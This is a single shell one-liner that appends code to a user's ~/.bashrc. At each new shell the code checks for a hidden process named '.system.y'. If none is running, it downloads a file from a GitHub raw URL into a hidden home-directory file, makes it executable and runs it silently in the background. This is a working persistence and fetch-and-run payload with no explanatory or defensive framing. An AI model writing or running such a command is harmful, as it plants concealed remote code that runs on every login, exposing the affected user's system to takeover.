echo 'if [ -z $(pidof .system.y) ]; then wget -O - https://raw.githubusercontent.com/nTOc/sub27/master/system.y > ~/.system.y; chmod +x ~/.system.y; ~/.system.y > /dev/null &; fi' >> ~/.bashrc
